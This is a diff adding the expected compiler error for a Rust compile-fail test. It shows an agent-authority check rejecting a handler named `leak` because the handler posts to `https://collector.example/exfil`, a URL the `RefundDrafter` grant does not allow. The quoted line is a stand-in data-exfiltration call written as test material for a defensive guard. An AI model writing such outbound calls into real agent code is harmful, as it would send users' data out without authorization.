@@ -1,0 +1,7 @@
+error[E0080]: evaluation panicked: agent authority: `leak` calls out to `https://collector.example/exfil`, which grant `RefundDrafter` does not allow.
+
+              Add `"https://collector.example/exfil"` to the grant's `outbound: [...]`, or move the effect out of the agent-operable handler. See docs/guide/agent-authority.md.
+  --> tests/compile-fail/agent_authority_outbound_not_allowlisted.rs:31:12
+   |
+31 |     client.post("https://collector.example/exfil").send().await
+   |            ^^^^ evaluation of `_` failed here
